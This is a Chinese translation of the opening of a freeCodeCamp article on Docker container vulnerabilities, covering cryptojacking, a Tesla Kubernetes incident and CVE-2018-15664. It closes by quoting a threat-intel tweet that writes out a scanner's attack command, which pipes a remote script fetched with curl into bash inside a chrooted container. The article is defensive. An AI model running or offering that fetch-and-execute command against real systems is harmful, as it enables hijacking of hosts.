# 2020 年如何发现并修复 Docker 容器漏洞

> 原文：<https://www.freecodecamp.org/news/how-to-find-and-fix-docker-container-vulnerabilities-in-2020/>

容器化允许工程团队创建运行和测试应用程序的沙盒环境。容器主要由从 docker hub 或其他公共图像存储库中获取的开源图像组成。

但这些开源图像有时可能包含漏洞，这些漏洞会危及容器的安全，进而危及其主机/服务器的安全。

由于这些容器运行在主机上，如果它们没有受到保护，就有可能在生产中劫持容器。

这种黑客攻击的一个很好的例子是[特斯拉对无保护的 Kubernetes 集群的密码劫持攻击](https://cointelegraph.com/news/tesla-cryptojacked-hackers-use-passwordless-system-to-mine-crypto)。在这次攻击中，攻击者能够下载并运行一个恶意脚本，使用特斯拉的 K8s (Kubernetes)集群提供的 GPU 来挖掘加密。他们能够通过将 CPU 使用率保持在最低水平，并在特定的时间间隔运行脚本来防止这种攻击。

在本文的过程中，我们将看看常见的容器漏洞以及修复它们的可能方法。

## 常见的容器漏洞及其修复方法

ops 工程师使用容器在封闭和受控的环境中打包和部署软件/应用程序。

为了避免重复发明轮子并加快上市时间，已经存在的开源图像被引入以满足运行软件所需的依赖性。这些映像通常包含某些漏洞，使得整个容器及其主机容易受到恶意攻击。

下面列出了一些常见的容器漏洞和暴露，以及如何减轻它们。

### 密码劫持

加密劫持是一种攻击，其中恶意脚本用于窃取设备的计算资源来挖掘加密货币。

最近在 Docker 上发现了一个漏洞，字典词条 [CVE-2018-15664](https://nvd.nist.gov/vuln/detail/CVE-2018-15664) 。此漏洞使得攻击者能够获得主机的超级用户访问权限。

除了能够使用主机的 CPU 和 GPU 资源来挖掘加密，攻击者还可以窃取敏感凭据，进行 DoS 攻击，发起网络钓鱼活动，等等。

如果容器包含恶意图像，攻击者就可以以 root 用户身份访问整个容器，因此容器很容易受到密码劫持。如果 docker 容器 API 端点可以在没有密码或安全防火墙的情况下在互联网上公开访问，它们也很容易受到攻击，就像 Tesla 的情况一样。

> 检测到针对暴露的 Docker API 端点的机会性大规模扫描活动。
> 
> 这些扫描使用 Alpine Linux 映像创建一个容器，并通过
> “命令”:“ch root/mnt/bin/sh-c ' curl-sL4[https://t.co/q047bRPUyj](https://t.co/q047bRPUyj)| bash；””，[#威胁](https://twitter.com/hashtag/threatintel?src=hash&ref_src=twsrc%5Etfw)[pic.twitter.com/vxszV5SF1o](https://t.co/vxszV5SF1o)
> 
> — Bad Packets Report (@bad_packets) [November 25, 2019](https://twitter.com/bad_packets/status/1199087675833085959?ref_src=twsrc%5Etfw)